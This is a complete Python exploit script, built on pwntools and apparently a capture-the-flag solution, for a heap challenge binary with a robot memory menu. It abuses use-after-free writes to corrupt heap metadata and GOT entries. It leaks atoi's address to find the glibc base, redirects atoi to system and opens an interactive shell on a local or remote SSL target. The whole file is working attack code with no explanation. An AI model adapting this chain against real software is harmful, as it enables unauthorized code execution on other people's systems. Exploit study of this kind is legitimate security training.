#!/usr/bin/env python3

from pwn import context, ELF, log, p16, p32, p64, remote, sys, u64

context.binary = elf = ELF('main_patched')
glibc = ELF('libc.so.6', checksec=False)


def get_process():
    if len(sys.argv) == 1:
        return elf.process()

    host, port = sys.argv[1], 443
    return remote(host, port, ssl=True, sni=host)


def create(p, size: int):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Provide robot memory size:\n', str(size).encode())


def program(p, index: int, data: bytes):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Provide robot\'s slot:\n', str(index).encode())
    p.sendafter(b'Program the robot:\n', data)


def destroy(p, index: int):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'Provide robot\'s slot:\n', str(index).encode())


def main():
    p = get_process()

    create(p, 0x410)
    create(p, 0x410)
    create(p, 0x421)

    destroy(p, 0)
    program(p, 0, p64(0) + p16(0xf940 - 0x10))
    create(p, 0x410)
    destroy(p, 0)

    destroy(p, 1)
    program(p, 1, p64(elf.sym.robot_memory_size))
    create(p, 0x410)
    create(p, 0x410)

    program(p, 1, p64(0x1000) + p64(0) + p32(1) * 5 + p64(0) + p32(0) +
            p64(elf.got.free) + p64(elf.got.atoi) + p64(elf.got.atoi))
    program(p, 0, p64(elf.plt.puts))
    destroy(p, 2)

    atoi_addr = u64(p.recvline().strip().ljust(8, b'\0'))
    glibc.address = atoi_addr - glibc.sym.atoi
    log.success(f'Glibc base address: {hex(glibc.address)}')

    program(p, 1, p64(glibc.sym.system))

    p.sendlineafter(b'> ', b'sh')
    p.interactive()


if __name__ == '__main__':
    main()
